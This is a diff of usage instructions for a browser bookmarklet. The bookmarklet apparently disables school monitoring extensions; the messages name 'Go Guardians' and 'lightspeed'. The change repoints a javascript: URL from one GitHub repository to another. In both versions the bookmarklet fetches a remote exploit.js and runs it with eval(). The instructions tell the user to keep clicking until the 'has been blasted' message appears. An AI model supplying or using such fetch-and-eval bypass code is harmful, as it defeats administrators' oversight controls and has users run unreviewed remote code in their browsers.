@@ -9,7 +9,7 @@ entire right click bookmark bar and click Add page...
 • set Name: to whatever you want, i recommend just naming it spam
 • set URL: to 
 ```
-javascript:fetch(`https://raw.githubusercontent.com/rice-a-rona/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+javascript:fetch(`https://raw.githubusercontent.com/Jonnycat-storage/lightspeed-Blaster/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
 ```
 • Alternative, copy  the code from gui.js and use that as the URL
 • click Save
@@ -20,7 +20,7 @@ javascript:fetch(`https://raw.githubusercontent.com/rice-a-rona/ext-remover/main
 • do not stop until you get the message
 ```
 Web Store
-Go Guardians ass has been blasted
+lightspeed has been blasted
 ```
 or similar
 
